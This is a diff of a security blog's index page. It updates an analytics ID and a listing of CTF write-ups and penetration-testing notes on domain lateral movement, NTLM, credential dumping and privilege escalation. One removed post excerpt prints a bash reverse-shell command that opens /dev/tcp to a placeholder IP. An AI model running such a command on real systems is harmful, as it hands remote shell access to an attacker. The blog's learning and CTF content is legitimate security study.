@@ -65,7 +65,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"e509bf56906f797e00a96ebece6ea445","google":{"measurement_id":"G-BLJ2TG3Q9T"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"cDl9nch6MITIDFI9oATLRdpm-gzGzoHsz","app_key":"X6LMz3T4TtGGD4SoDAQrR5g4","server_url":"https://api.dr0n.top","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"e509bf56906f797e00a96ebece6ea445","google":{"measurement_id":"G-456TDFZC89"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"cDl9nch6MITIDFI9oATLRdpm-gzGzoHsz","app_key":"X6LMz3T4TtGGD4SoDAQrR5g4","server_url":"https://api.dr0n.top","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -95,13 +95,13 @@
     <!-- Google tag (gtag.js) -->
     <script async>
       if (!Fluid.ctx.dnt) {
-        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=G-BLJ2TG3Q9T", function() {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=G-456TDFZC89", function() {
           window.dataLayer = window.dataLayer || [];
           function gtag() {
             dataLayer.push(arguments);
           }
           gtag('js', new Date());
-          gtag('config', 'G-BLJ2TG3Q9T');
+          gtag('config', 'G-456TDFZC89');
         });
       }
     </script>
@@ -328,6 +328,532 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h2 class="index-header">
         
+        <a href="/posts/dcf6516b/" target="_self">
+          内网渗透学习(域横向移动篇)
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/posts/dcf6516b/" target="_self">
+        <div>
+          目录结构参考的是The Hacker Recipes因为内容太多就分几篇来总结了  域渗透学习(Credentials篇)域渗透学习(NTLM篇)
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-08-16 12:00" pubdate>
+              2025-08-16
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%80%BB%E7%BB%93/" class="category-chain-item">总结</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E6%80%BB%E7%BB%93/">#总结</a>
+            
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">#内网渗透</a>
+            
+              <a href="/tags/%E5%9F%9F/">#域</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/posts/5a3650d1/" target="_self">
+          春秋云境 Initial
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/posts/5a3650d1/" target="_self">
+        <div>
+          开始签到白嫖打完所有靶机计划!  Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。  前置知识: 内网渗透学习(代理篇)域渗透学习(Credentials篇)域渗透学习(NTLM篇)linux提权笔记 入口（172.22.1.15）根据报错信息得知是ThinkPHP 5，存在nday，可以getshell
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-07-14 16:00" pubdate>
+              2025-07-14
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="category-chain-item">内网渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">#内网渗透</a>
+            
+              <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/">#春秋云境</a>
+            
+              <a href="/tags/%E4%B8%93%E4%B8%9A%E5%BE%BD%E7%AB%A0/">#专业徽章</a>
+            
+              <a href="/tags/DCSync/">#DCSync</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/posts/3f5b8fbe/" target="_self">
+          域渗透学习(NTLM篇)
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/posts/3f5b8fbe/" target="_self">
+        <div>
+          LM Hash 和 NTLM Hash 和 Net-NTLM hash在Windows系统中，身份验证通常使用 NTLM 协议，NTLM 协议不会直接传输明文密码，而是基于密码的哈希值进行质询-响应认证。这些哈希值由系统 API（如 LsaLogonUser）根据用户密码生成  Windows 中存在两种主要的本地存储哈希： LM Hash（LAN Manager Hash） NT Hash（也称
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-06-28 12:00" pubdate>
+              2025-06-28
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%80%BB%E7%BB%93/" class="category-chain-item">总结</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E6%80%BB%E7%BB%93/">#总结</a>
+            
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">#内网渗透</a>
+            
+              <a href="/tags/%E5%9F%9F/">#域</a>
+            
+              <a href="/tags/NTLM/">#NTLM</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/posts/fcb3a8d7/" target="_self">
+          linux提权笔记
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/posts/fcb3a8d7/" target="_self">
+        <div>
+          记录在比赛和靶场中遇到的提权方法 推荐本地部署一个GTFOBins用来查询 suid 提权 SUID是一种特殊权限，可以让调用者在执行过程中暂时获得该文件拥有者的权限。如果可以找到并运行root用户所拥有的SUID的文件，那么就可以在运行该文件的时候获得root用户权限  查找当前系统上文件属主为 root 并且拥有 SUID 权限的可执行文件 1234find / -user root -per
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-05-09 12:00" pubdate>
+              2025-05-09
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%80%BB%E7%BB%93/" class="category-chain-item">总结</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E6%80%BB%E7%BB%93/">#总结</a>
+            
+              <a href="/tags/%E6%8F%90%E6%9D%83/">#提权</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/posts/e0ff8995/" target="_self">
+          域渗透学习(Credentials篇)
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/posts/e0ff8995/" target="_self">
+        <div>
+          DumpingDCSyncDcsync(domain Controller synchronization)：在域树或者域森林中，不同的DC之间，每隔15分钟会进行一次域数据的同步。比如当一个辅助域控想从主域控获取数据时，辅助域控会利用 DRS(Directory Replication Service) 协议向主域控发起一个 IDL_DRSGetNCChanges 请求。请求的数据包括需要同步的
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-04-28 12:00" pubdate>
+              2025-04-28
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%80%BB%E7%BB%93/" class="category-chain-item">总结</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E6%80%BB%E7%BB%93/">#总结</a>
+            
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">#内网渗透</a>
+            
+              <a href="/tags/%E5%9F%9F/">#域</a>
+            
+              <a href="/tags/Credentials/">#Credentials</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/posts/74a23a1b/" target="_self">
+          第八届西湖论剑中国杭州网络安全安全技能大赛初赛 部分wp
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/posts/74a23a1b/" target="_self">
+        <div>
+          dseasydatalog分析error.log发现首先上传了木马，然后用蚁剑进行连接 全局搜索发现包含一个zip和jpg  压缩包数据很少直接手动提取出来，图片数据太多用脚本提取出来 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import redef extract_jpg
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-01-18 20:00" pubdate>
+              2025-01-18
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/wp/" class="category-chain-item">wp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/wp/">#wp</a>
+            
+              <a href="/tags/2025%E7%AB%9E%E8%B5%9B/">#2025竞赛</a>
+            
+              <a href="/tags/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">#西湖论剑</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/posts/230fa1fb/" target="_self">
+          2024“中华武数杯”全国网络攻防精英赛RHG wp
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/posts/230fa1fb/" target="_self">
+        <div>
+          第一次打RHG模式，i春秋的平台和在网上看到的不太一样，一轮是一小时，也可以手动一题一题做然后提交  写了个脚本获取题目信息然后下载，运行写好的exp然后提交flag（写不来自动分析漏洞，就人工代替ai） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2024-11-30 18:00" pubdate>
+              2024-11-30
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/wp/" class="category-chain-item">wp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/wp/">#wp</a>
+            
+              <a href="/tags/2024%E7%AB%9E%E8%B5%9B/">#2024竞赛</a>
+            
+              <a href="/tags/%E4%B8%AD%E5%8D%8E%E6%AD%A6%E6%95%B0%E6%9D%AF/">#中华武数杯</a>
+            
+              <a href="/tags/RHG/">#RHG</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/posts/f2e1654d/" target="_self">
+          第七届浙江省大学生网络与信息安全竞赛决赛-WP
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/posts/f2e1654d/" target="_self">
+        <div>
+          总榜Rank1，在毕业前拿到榜一也是圆满了 :) webwucanrce123456789101112131415161718&lt;?phpecho &quot;get只接受code欧,flag在上一级目录&lt;br&gt;&quot;;$filename = __FILE__;highlight_file($filename);if(isset($_GET[&#x27;code&#x27;]
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2024-11-09 14:30" pubdate>
+              2024-11-09
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/wp/" class="category-chain-item">wp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/wp/">#wp</a>
+            
+              <a href="/tags/2024%E7%AB%9E%E8%B5%9B/">#2024竞赛</a>
+            
+              <a href="/tags/%E6%B5%99%E6%B1%9F/">#浙江</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
         <a href="/posts/42d6129/" target="_self">
           第七届浙江省大学生网络与信息安全竞赛预赛-WP
         </a>
@@ -393,15 +919,15 @@
     <article class="col-12 col-md-12 mx-auto index-info">
       <h2 class="index-header">
         
-        <a href="/posts/52375b43/" target="_self">
-          内网渗透学习(代理篇)
+        <a href="/posts/a04618bd/" target="_self">
+          windows提权笔记
         </a>
       </h2>
 
       
-      <a class="index-excerpt index-excerpt__noimg" href="/posts/52375b43/" target="_self">
+      <a class="index-excerpt index-excerpt__noimg" href="/posts/a04618bd/" target="_self">
         <div>
-          本文中使用的代理工具可通过我的脚本一键下载https://github.com/dr0n1/CTF_misc_auto_deploy 反弹shell推荐在本地部署一个reverse-shell-generator，可以很方便的查看命令 以下是几个常用的 bash -i1/bin/sh -i &gt;&amp; /dev/tcp/1.1.1.1/8888 0&gt;&amp;1  nc1234567
+          土豆家族原理可以与域渗透学习(NTLM篇)的内容结合起来看 一般使用 Potato 提权需要下列两个特权中的一个  SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege  以下用户拥有SeImpersonatePrivilege权限，而 SeAssignPrimaryTokenPrivilege 只有更高权限的账户比如SYSTEM才有 12345
         </div>
       </a>
 
@@ -409,8 +935,8 @@
         
           <div class="post-meta mr-3">
             <i class="iconfont icon-date"></i>
-            <time datetime="2024-10-10 12:00" pubdate>
-              2024-10-10
+            <time datetime="2024-10-11 12:00" pubdate>
+              2024-10-11
             </time>
           </div>
         
@@ -442,533 +968,7 @@
             
               <a href="/tags/%E6%80%BB%E7%BB%93/">#总结</a>
             
-              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">#内网渗透</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h2 class="index-header">
-        
-        <a href="/posts/da856207/" target="_self">
-          2024年“羊城杯”粤港澳大湾区网络安全大赛 wp
-        </a>
-      </h2>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/posts/da856207/" target="_self">
-        <div>
-          [初赛] 数据安全data-analy1恢复被打乱的数据 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import csvimport reimport pandas as pddata = pd.read_csv(&quot;person_data.csv&quot;,
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2024-08-28 09:00" pubdate>
-              2024-08-28
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/wp/" class="category-chain-item">wp</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/wp/">#wp</a>
-            
-              <a href="/tags/%E7%BE%8A%E5%9F%8E%E6%9D%AF/">#羊城杯</a>
-            
-              <a href="/tags/2024%E7%AB%9E%E8%B5%9B/">#2024竞赛</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h2 class="index-header">
-        
-        <a href="/posts/21a69435/" target="_self">
-          php-fpm攻击总结
-        </a>
-      </h2>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/posts/21a69435/" target="_self">
-        <div>
-          PHP-FPM 是 FastCGI 的一个具体实现（协议解析器） Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给FPM，然后FPM按照fastcgi的协议将TCP流解析成真正的数据 举个例子，用户访问http://127.0.0.1/index.php?a=1&amp;b=2，如果web目录是&#x2F;var&#x2F;www&#x2F;html，那么Nginx会
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2024-07-22 12:00" pubdate>
-              2024-07-22
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E6%80%BB%E7%BB%93/" class="category-chain-item">总结</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/php/">#php</a>
-            
-              <a href="/tags/%E6%80%BB%E7%BB%93/">#总结</a>
-            
-              <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/">#中间件</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h2 class="index-header">
-        
-        <a href="/posts/5f3ac2d3/" target="_self">
-          绕过disable_functions的方法总结
-        </a>
-      </h2>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/posts/5f3ac2d3/" target="_self">
-        <div>
-          常规函数函数绕过123456789101112131415161718&lt;?php//exececho exec(&#x27;whoami&#x27;);//shell_exececho shell_exec(&#x27;whoami&#x27;);//systemsystem(&#x27;whoami&#x27;);//passthrupassthru(&quot;whoami&quot;)
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2024-07-17 12:00" pubdate>
-              2024-07-17
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E6%80%BB%E7%BB%93/" class="category-chain-item">总结</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/php/">#php</a>
-            
-              <a href="/tags/%E6%80%BB%E7%BB%93/">#总结</a>
-            
-              <a href="/tags/bypass/">#bypass</a>
-            
-              <a href="/tags/disable-functions/">#disable_functions</a>
-            
-              <a href="/tags/pwn/">#pwn</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h2 class="index-header">
-        
-        <a href="/posts/deeac2cd/" target="_self">
-          第十七届全国大学生信息安全竞赛-华东南分区赛
-        </a>
-      </h2>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/posts/deeac2cd/" target="_self">
-        <div>
-          1签到+4web+4pwn web-welcome签到，Ctrl+U  web-submitbreak文件上传，有对内容检测，使用短标签绕过   fix添加黑名单 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php// $path = &quot;./uploads&quot
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2024-06-25 12:30" pubdate>
-              2024-06-25
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/wp/" class="category-chain-item">wp</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/awdp/">#awdp</a>
-            
-              <a href="/tags/wp/">#wp</a>
-            
-              <a href="/tags/ciscn/">#ciscn</a>
-            
-              <a href="/tags/2024%E7%AB%9E%E8%B5%9B/">#2024竞赛</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h2 class="index-header">
-        
-        <a href="/posts/f249db01/" target="_self">
-          春秋云境 GreatWall(第一届长城杯半决赛渗透题)
-        </a>
-      </h2>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/posts/f249db01/" target="_self">
-        <div>
-          ThinkPHP (172.28.23.17)先扫描端口，发现开放了两个web服务  8080是一个后台登录框，版本是ThinkPHP V5.0.23  直接用tp5的nday打 写入shell后根目录有flag1  然后上传fscan开始扫内网 1234567891011121: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue s
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2024-06-10 20:00" pubdate>
-              2024-06-10
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="category-chain-item">内网渗透</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">#内网渗透</a>
-            
-              <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/">#春秋云境</a>
-            
-              <a href="/tags/%E5%A4%9A%E7%BB%B4%E6%8C%91%E6%88%98/">#多维挑战</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h2 class="index-header">
-        
-        <a href="/posts/20b347fd/" target="_self">
-          2024宁波市第七届网络安全大赛决赛 awd wp
-        </a>
-      </h2>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/posts/20b347fd/" target="_self">
-        <div>
-          pwn攻击 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *context.arch=&#x27;amd64&#x27;import sysdef add(ind,size
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2024-05-25 18:00" pubdate>
-              2024-05-25
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/wp/" class="category-chain-item">wp</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/wp/">#wp</a>
-            
-              <a href="/tags/%E5%AE%81%E6%B3%A2/">#宁波</a>
-            
-              <a href="/tags/awd/">#awd</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h2 class="index-header">
-        
-        <a href="/posts/8ba5208d/" target="_self">
-          第一届长城杯信息安全铁人三项赛决赛 取证溯源 wp
-        </a>
-      </h2>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/posts/8ba5208d/" target="_self">
-        <div>
-          取证溯源 1、您的同事李白在运维一台部署了移动应用服务端的linux服务器时发现了异常，好像被黑客攻击了。小李通过简单分析，发现可能是由于公司的移动应用和其服务端程序都存在安全问题导致的。小李将当天可能与攻击相关的流量导出，并与移动应用一起打包压缩，你可以下载分析，也可以登录此服务器进行攻击溯源、排查等，提供了SSH和VNC访问的方式供您和您的团队进行分析取证。  关卡01： 100 分 关卡描述
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2024-05-24 18:00" pubdate>
-              2024-05-24
-            </time>
-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/wp/" class="category-chain-item">wp</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/wp/">#wp</a>
-            
-              <a href="/tags/%E9%95%BF%E5%9F%8E%E6%9D%AF/">#长城杯</a>
-            
-              <a href="/tags/2024%E7%AB%9E%E8%B5%9B/">#2024竞赛</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h2 class="index-header">
-        
-        <a href="/posts/19d58d81/" target="_self">
-          第十七届全国大学生信息安全竞赛-创新实践能力赛初赛
-        </a>
-      </h2>
-
-      
-      <a class="index-excerpt index-excerpt__noimg" href="/posts/19d58d81/" target="_self">
-        <div>
-          miscPower Trajectory Diagram先将npz解压，然后将功耗转成图片分析 12345678910from PIL import Imageimport numpy as npind=np.load(&quot;index.npy&quot;)p=np.load(&quot;trace.npy&quot;)for j,a in enumerate(p):    img=Imag
-        </div>
-      </a>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2024-05-20 12:30" pubdate>
-              2024-05-20
-            </time>
